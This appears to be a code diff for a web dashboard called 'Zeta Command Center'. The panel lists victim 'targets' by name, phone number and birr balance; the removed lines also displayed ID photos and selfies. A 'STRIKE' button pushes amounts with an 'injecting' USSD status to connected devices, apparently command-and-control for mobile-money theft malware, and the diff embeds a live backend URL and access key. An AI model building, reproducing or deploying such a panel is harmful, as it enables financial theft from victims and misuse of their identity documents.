@@ -6,172 +6,99 @@
 <title>Zeta Control Panel</title>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
-  body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: #121212;
-    color: #e0e0e0;
-    padding: 20px;
+  :root { --neon-green: #00ff41; --bg-dark: #0a0a0a; --card-bg: #161616; }
+  body { font-family: 'Courier New', Courier, monospace; background: var(--bg-dark); color: #e0e0e0; margin: 0; padding: 10px; }
+  .container { max-width: 1200px; margin: 0 auto; }
+  h1 { color: var(--neon-green); text-transform: uppercase; letter-spacing: 2px; border-bottom: 2px solid var(--neon-green); padding-bottom: 10px; font-size: 1.5rem; }
+  
+  /* Responsive Table Replacement for Mobile */
+  .target-grid { display: grid; grid-template-columns: 1fr; gap: 15px; margin-top: 20px; }
+  .target-card { background: var(--card-bg); border: 1px solid #333; padding: 15px; border-radius: 8px; position: relative; }
+  .target-card.active { border-color: var(--neon-green); box-shadow: 0 0 10px rgba(0, 255, 65, 0.2); }
+  
+  /* Desktop View */
+  @media (min-width: 768px) {
+    .target-grid { grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); }
   }
-  .container {
-    max-width: 1200px;
-    margin: 0 auto;
-  }
-  h1 {
-    color: #00ff41;
-    border-bottom: 2px solid #00ff41;
-    padding-bottom: 10px;
-  }
-  table {
-    width: 100%;
-    border-collapse: collapse;
-    margin-top: 20px;
-    background: #1e1e1e;
-    border-radius: 8px;
-    overflow: hidden;
-  }
-  th, td {
-    padding: 12px;
-    text-align: left;
-    border-bottom: 1px solid #333;
-  }
-  th {
-    background: #252525;
-    color: #00ff41;
-  }
-  .balance {
-    font-weight: bold;
-    color: #ffcc00;
-  }
-  .btn-send {
-    background: #00ff41;
-    color: black;
-    border: none;
-    padding: 8px 12px;
-    cursor: pointer;
-    border-radius: 4px;
-    font-weight: bold;
-    transition: background 0.2s ease;
-  }
-  .btn-send:hover {
-    background: #00cc33;
-  }
-  input[type="number"] {
-    background: #333;
-    color: white;
-    border: 1px solid #444;
-    padding: 6px 8px;
-    border-radius: 4px;
-    width: 100px;
-  }
-  .img-thumb {
-    width: 50px;
-    height: 50px;
-    object-fit: cover;
-    border-radius: 4px;
-    cursor: pointer;
-    border: 1px solid #444;
-    margin-right: 5px;
-  }
-  #status {
-    margin-top: 10px;
-    font-style: italic;
-    color: #00ff41;
-  }
+
+  .field { margin-bottom: 8px; font-size: 0.9rem; }
+  .label { color: #888; text-transform: uppercase; font-size: 0.7rem; }
+  .value { color: #fff; }
+  .balance { color: #ffcc00; font-weight: bold; font-size: 1.1rem; }
+  
+  .status-pill { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.7rem; background: #333; }
+  .status-injecting { background: #aa0000; color: white; animation: blink 1s infinite; }
+  
+  @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+
+  input[type="number"] { background: #222; color: var(--neon-green); border: 1px solid #444; padding: 10px; border-radius: 4px; width: 60%; font-size: 1rem; }
+  .btn-send { background: var(--neon-green); color: black; border: none; padding: 10px 20px; cursor: pointer; border-radius: 4px; font-weight: bold; width: 35%; float: right; }
+  
+  #status-bar { font-size: 0.8rem; color: var(--neon-green); margin-bottom: 10px; background: #1a1a1a; padding: 5px 10px; border-radius: 4px; }
 </style>
 </head>
 <body>
 
 <div class="container">
   <h1>ZETA COMMAND CENTER</h1>
-  <div id="status">Connecting to Supabase...</div>
-  
-  <table id="targetTable">
-    <thead>
-      <tr>
-        <th>Name / Phone</th>
-        <th>UUID</th>
-        <th>Docs</th>
-        <th>Live Balance</th>
-        <th>Set Amount</th>
-        <th>Action</th>
-      </tr>
-    </thead>
-    <tbody></tbody>
-  </table>
+  <div id="status-bar">SYSTEM INITIALIZING...</div>
+  <div id="targetList" class="target-grid">
+    </div>
 </div>
 
 <script>
-  // 1. Supabase client
-  const { createClient } = supabase;
-
   const SUPABASE_URL = 'https://apdsaisgviycynayhppl.supabase.co';
-  const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFwZHNhaXNndml5Y3luYXlocHBsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY3NTU5NjEsImV4cCI6MjA4MjMzMTk2MX0.BgCb2iJ8iywkG1pkKlc8HKdlZmNlFYQ4rZB5Kjq_dMU'; // replace with your anon key
+  const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFwZHNhaXNndml5Y3luYXlocHBsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY3NTU5NjEsImV4cCI6MjA4MjMzMTk2MX0.BgCb2iJ8iywkG1pkKlc8HKdlZmNlFYQ4rZB5Kjq_dMUY'; // Alpha, use your key here.
+  const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-  const supabaseClient = createClient(SUPABASE_URL, SUPABASE_KEY);
+  function renderCard(target) {
+    const container = document.getElementById('targetList');
+    let card = document.getElementById(`card-${target.id}`);
+    
+    const isInjecting = target.ussd_status === 'injecting';
+    const lastSeenDate = new Date(target.last_seen).toLocaleTimeString();
 
-  // 2. Render row
-  function renderRow(target) {
-  const tbody = document.querySelector('#targetTable tbody');
-  const existingRow = document.querySelector(`#row-${target.id}`);
+    const cardHtml = `
+      <div class="target-card ${isInjecting ? 'active' : ''}" id="card-${target.id}">
+        <div class="field">
+          <span class="label">Target:</span> <span class="value"><strong>${target.full_name || 'UNKNOWN'}</strong> (${target.phone_number || 'N/A'})</span>
+        </div>
+        <div class="field">
+          <span class="label">Balance:</span> <span class="balance">${target.current_balance} ETB</span>
+        </div>
+        <div class="field">
+          <span class="label">Active USSD:</span> <span class="value" style="color:var(--neon-green)">${target.active_ussd || 'None'}</span>
+        </div>
+        <div class="field">
+          <span class="status-pill ${isInjecting ? 'status-injecting' : ''}">${target.ussd_status || 'IDLE'}</span>
+          <span class="label" style="margin-left:10px">Last Seen:</span> <span class="value">${lastSeenDate}</span>
+        </div>
+        <hr style="border:0; border-top:1px solid #333; margin:15px 0;">
+        <div style="overflow:auto">
+          <input type="number" id="amt-${target.id}" value="${target.target_amount}" placeholder="Amount">
+          <button class="btn-send" onclick="updateAmount('${target.id}')">STRIKE</button>
+        </div>
+      </div>
+    `;
 
-  // Determine status badge color
-  const statusColor = target.ussd_status === 'injecting' ? '#00ff41' : '#888';
-
-  // Build row HTML
-  const rowHtml = `
-    <tr id="row-${target.id}">
-      <td>
-        <strong>${target.full_name}</strong><br>
-        <small>${target.phone_number}</small>
-      </td>
-      <td><small>${target.id.substring(0, 8)}...</small></td>
-      <td>
-        ${target.id_photo_base64 ? `<img class="img-thumb" src="data:image/png;base64,${target.id_photo_base64}" title="ID Photo">` : ''}
-        ${target.selfie_base64 ? `<img class="img-thumb" src="data:image/png;base64,${target.selfie_base64}" title="Selfie">` : ''}
-      </td>
-      <td class="balance">${target.current_balance} ETB</td>
-      <td>
-        <span style="color: ${statusColor}; font-weight: bold; font-size: 0.9em;">
-          ${target.ussd_status || 'idle'}
-        </span>
-      </td>
-      <td>
-        <input type="number" id="amt-${target.id}" placeholder="0.00" value="${target.target_amount}">
-      </td>
-      <td>
-        <button class="btn-send" onclick="updateAmount('${target.id}')">PUSH</button>
-      </td>
-    </tr>
-  `;
-
-  // If row already exists, replace it; otherwise append new
-  if (existingRow) {
-    existingRow.outerHTML = rowHtml;
-  } else {
-    tbody.innerHTML += rowHtml;
-  }
-}
-
-
-  // 3. Fetch all targets
-  async function fetchTargets() {
-    const { data, error } = await supabaseClient
-      .from('targets')
-      .select('*')
-      .order('created_at', { ascending: false });
-
-    if (error) {
-      console.error(error);
-      document.getElementById('status').innerText = 'Error: ' + error.message;
-      return;
+    if (card) {
+      card.outerHTML = cardHtml;
+    } else {
+      container.insertAdjacentHTML('beforeend', cardHtml);
     }
-
-    document.querySelector('#targetTable tbody').innerHTML = '';
-    data.forEach(renderRow);
-    document.getElementById('status').innerText = `System Online | ${data.length} Targets Found`;
   }
 
-  // 4. Update target amount
+  async function fetchTargets() {
+    const { data, error } = await supabaseClient.from('targets').select('*').order('last_seen', { ascending: false });
+    if (error) {
+      document.getElementById('status-bar').innerText = 'ERROR: ' + error.message;
+    } else {
+      document.getElementById('targetList').innerHTML = '';
+      data.forEach(renderCard);
+      document.getElementById('status-bar').innerText = `ZETA ONLINE | ${data.length} NODES CONNECTED`;
+    }
+  }
+
   async function updateAmount(id) {
     const amount = document.getElementById(`amt-${id}`).value;
     const { error } = await supabaseClient
@@ -179,20 +106,17 @@
       .update({ target_amount: amount, ussd_status: 'injecting' })
       .eq('id', id);
 
-    if (error) alert("Error sending command: " + error.message);
-    else alert(`Command Pushed to Device: ${amount} ETB`);
+    if (error) alert("Strike Failed: " + error.message);
+    else console.log(`Command Pushed: ${amount} ETB`);
   }
 
-  // 5. Initial fetch
   fetchTargets();
 
-  // 6. Realtime subscription (updates only changed row)
-  supabaseClient.channel('custom-all-channel')
+  // Real-time listener
+  supabaseClient.channel('zeta-sync')
     .on('postgres_changes', { event: '*', schema: 'public', table: 'targets' }, payload => {
-      if (payload.new) renderRow(payload.new);
-    })
-    .subscribe();
+      if (payload.new) renderCard(payload.new);
+    }).subscribe();
 </script>
-
 </body>
 </html>
